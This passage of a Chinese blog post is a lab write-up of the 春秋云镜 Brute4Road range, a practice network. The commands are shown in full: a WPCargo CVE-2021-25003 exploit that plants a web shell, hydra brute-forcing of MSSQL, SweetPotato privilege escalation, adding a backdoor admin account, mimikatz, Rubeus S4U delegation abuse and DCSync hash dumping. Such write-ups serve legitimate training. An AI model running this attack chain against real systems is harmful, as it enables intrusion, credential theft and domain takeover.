class="line"> |      - https://wpscan.com/vulnerability/ef5aa8a7-23a7-4ce0-bb09-d9c986386114</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1435</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Unauthenticated SQL Injection</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/f5fdb762-cbc1-4352-9ab2-cbba9d3d33e2</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44004</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0e725ec0-4897-4ba7-a803-80e8aafacbd1</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Missing authorization to Authenticated (Subscriber+) Settings Update</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/b433fff9-b501-4fb3-9f04-5e18b64b0a90</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-54271</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/0c467a78-1ba4-4c0d-84e6-db54fc1b0c63</span><br><span class="line"> |</span><br><span class="line"> | [!] Title: WPCargo Track &amp; Trace &lt;= 7.0.6 - Authenticated (Contributor+) Insecure Direct Object Reference</span><br><span class="line"> |     References:</span><br><span class="line"> |      - https://wpscan.com/vulnerability/594ae221-06b6-4bc2-b5b6-0f9bac880f7b</span><br><span class="line"> |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-31609</span><br><span class="line"> |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/887ecedb-0bc8-4488-b6fa-27cfa22345e6</span><br><span class="line"> |</span><br><span class="line"> | Version: 6.x.x (80% confidence)</span><br><span class="line"> | Found By: Readme - Stable Tag (Aggressive Detection)</span><br><span class="line"> |  - http://172.22.2.18/wp-content/plugins/wpcargo/readme.txt</span><br></pre></td></tr></table></figure>
+
+<p>存在wpcargo插件，有一个rce的漏洞<a target="_blank" rel="noopener" href="https://github.com/biulove0x/CVE-2021-25003">https://github.com/biulove0x/CVE-2021-25003</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop/tmp]</span><br><span class="line">└─# python3 2 -t &quot;http://172.22.2.18/&quot;</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.17</span><br><span class="line"></span><br><span class="line">############################################</span><br><span class="line"># @author : biulove0x                      #</span><br><span class="line"># @name   : WP Plugins WPCargo Exploiter   #</span><br><span class="line"># @cve    : CVE-2021-25003                 #</span><br><span class="line">############################################</span><br><span class="line"></span><br><span class="line">[proxychains] Strict chain  ...  192.168.11.1:9999  ...  172.22.2.18:80  ...  OK</span><br><span class="line">[-] http://172.22.2.18/wp-content/wp-conf.php =&gt; Uploaded!</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road1.png"></p>
+<p>蚁剑连接，可以拿到数据库的密码</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road2.png"></p>
+<p>flag2在数据库里，在另一张表里有很多密码</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road3.png"></p>
+<p>是172.22.2.16 msssql数据库的密码本，然后动手爆破，mssql的默认用户名是<code>sa</code>，因为导出来的有空格，所以把前面的空格处理掉</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">└─# grep -P &quot;\w+&quot; pass -o &gt;2</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# hydra -l sa -P pass 172.22.2.16 mssql -f -I -vV</span><br><span class="line">[1433][mssql] host: 172.22.2.16   login: sa   password: ElGNkOiC</span><br></pre></td></tr></table></figure>
+
+<p>然后用MDUT连接</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road4.png"></p>
+<p>上传<a target="_blank" rel="noopener" href="https://github.com/uknowsec/SweetPotato?tab=readme-ov-file">sweetpotato.exe</a>然后提权</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road5.png"></p>
+<p>flag03在C:\Users\Administrator\flag\下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;type C:\Users\Administrator\flag\flag03.txt&quot;</span><br></pre></td></tr></table></figure>
+
+<p>netstat -ano发现开启了3389</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       692</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       2680</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:2383           0.0.0.0:0              LISTENING       2932</span><br><span class="line"></span><br><span class="line">  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       812</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>添加一个用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net user lv Asd123123 /add&quot;</span><br><span class="line">C:/Users/MSSQLSERVER/Desktop/SweetPotato.exe -a &quot;net localgroup administrators lv /add&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然后远程桌面登录</p>
+<p><img src="https://raw.githubusercontent.com/872323857/images/master/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Brute4Road6.png"></p>
+<p>可以发现有域环境，先上传mimikatz提取hash，上传bloodhound可以发现有约束性委派</p>
+<p>获取到域用户的哈希为cea3e66a2715c71423e7d3f0ff6cd352</p>
+<p>通过Rubeus申请机器账户MSSQLSERVER的TGT，执行后，将得到 Base64 加密后的 TGT 票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe asktgt /user:MSSQLSERVER$ /rc4:cea3e66a2715c71423e7d3f0ff6cd352 /domain:xiaorang.lab /dc:DC.xiaorang.lab /nowrap</span><br></pre></td></tr></table></figure>
+
+<p>然后使用 S4U2Self 扩展代表域管理员 Administrator 请求针对域控 LDAP 服务的票据，并将得到的票据传递到内存中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/DC.xiaorang.lab /dc:DC.xiaorang.lab /ptt /ticket:[base64(ticket.kirbi)]</span><br></pre></td></tr></table></figure>
+
+<p>LDAP服务具有DCSync权限，可以导出域内用户哈希</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:xiaorang.lab /user:Administrator&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p>得到域管的哈希为1a19251fbd935969832616366ae3fe62</p>
+<p>然后就可以用WMI服务登录域控，flag在C:\Users\Administrator\flag下</p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E9%9D%B6%E6%9C%BA/" rel="tag"># 靶机</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2025/04/10/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Hospital/" rel="prev" title="春秋云镜-Hospital">
+      <i class="fa fa-chevron-left"></i> 春秋云镜-Hospital
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">lvzhouhang</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">22</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">16</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lvzhouhang</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">279k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/xxx/anime.min.js"></script>
+  <script src="/xxx/velocity/velocity.min.js"></script>
+  <script src="/xxx/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
